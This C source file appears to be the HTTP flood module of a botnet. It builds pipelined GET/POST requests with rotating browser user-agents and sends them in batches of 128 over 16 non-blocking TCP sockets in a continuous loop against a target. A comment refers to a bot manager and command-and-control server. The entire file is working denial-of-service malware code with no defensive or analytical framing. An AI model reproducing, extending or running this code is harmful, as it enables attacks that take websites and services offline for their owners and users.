#define _GNU_SOURCE

#include "../../../../utils/headers/includes.h"
#include "../../../../utils/headers/util.h"
#include "../../../../utils/headers/resolver.h"
#include "../../attack.h"

static EncryptionTable user_agents[] = {
    UA_WIN_10_CHROME,
    UA_MAC_CHROME,
    UA_LINUX_CHROME,
    UA_WIN_FIREFOX
};

#define BATCH_SIZE 128

void flood_http(struct flood *flood)
{
    char *method = get_option_string(flood->num_of_options, flood->options, OPT_HTTP_METHOD, enc[HTTP_GET_STR].string);
    char *domain = get_option_string(flood->num_of_options, flood->options, OPT_HTTP_HOST, NULL);
    char *path = get_option_string(flood->num_of_options, flood->options, OPT_HTTP_PATH, enc[HTTP_SLASH].string);
    char *postdata = flood->settings->payload;
    
    uint16_t dport = htons(flood->settings->dest_port == 0xffff ? 80 : flood->settings->dest_port);

    struct in_addr addr_in;
    addr_in.s_addr = flood->targets[0].addr;
    if (!domain) domain = inet_ntoa(addr_in);

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = dport;
    addr.sin_addr.s_addr = flood->targets[0].addr;

    char request[4096];
    const char *ua = enc[user_agents[rand_next() % 4]].string;

    memset(request, 0, sizeof(request));
    int req_len = sprintf(request, enc[HTTP_REQ_FMT].string, method, path);
    req_len += sprintf(request + req_len, enc[HTTP_HOST_FMT].string, domain);
    req_len += sprintf(request + req_len, enc[HTTP_UA_FMT].string, ua);
    req_len += sprintf(request + req_len, enc[HTTP_ACCEPT_FMT].string, enc[HTTP_ACCEPT_HTML].string);
    req_len += sprintf(request + req_len, enc[HTTP_ACCEPT_ENC_FMT].string);
    req_len += sprintf(request + req_len, enc[HTTP_CONN_FMT].string);
        
    if (postdata) {
        req_len += sprintf(request + req_len, enc[HTTP_CONTENT_LEN_FMT].string, (int)strlen(postdata));
        strcat(request, postdata);
        req_len += strlen(postdata);
    } else {
        req_len += sprintf(request + req_len, enc[HTTP_NEWLINE].string);
    }

    char *batch_buf = calloc(1, req_len * BATCH_SIZE);
    for (int i = 0; i < BATCH_SIZE; i++) {
        memcpy(batch_buf + (i * req_len), request, req_len);
    }
    int batch_len = req_len * BATCH_SIZE;

    /* The bot manager handles process forking natively via "thread=" in CNC. 
       This function runs isolated inside its own fork! */
    int fds[16];
    for (int i = 0; i < 16; i++) fds[i] = -1;

    while (*flood->running) {
        for (int i = 0; i < 16; i++) {
            if (fds[i] == -1) {
                int fd = sys_socket(AF_INET, SOCK_STREAM, 0);
                if (fd >= 0) {
                    sys_fcntl(fd, F_SETFL, sys_fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
                    int one = 1;
                    sys_setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
                    sys_connect(fd, (struct sockaddr *)&addr, sizeof(addr));
                    fds[i] = fd;
                }
            } else {
                if (sys_sendto(fds[i], batch_buf, batch_len, MSG_NOSIGNAL, NULL, 0) <= 0) {
                    if (errno != EAGAIN && errno != EWOULDBLOCK) {
                        sys_close(fds[i]); fds[i] = -1;
                    }
                }
            }
        }
        
        if (flood->settings->sleep > 0)
            sys_usleep(flood->settings->sleep * 1000);
        else
            sys_usleep(1000);
    }
    
    for (int i = 0; i < 16; i++) {
        if (fds[i] != -1) sys_close(fds[i]);
    }
    free(batch_buf);
}
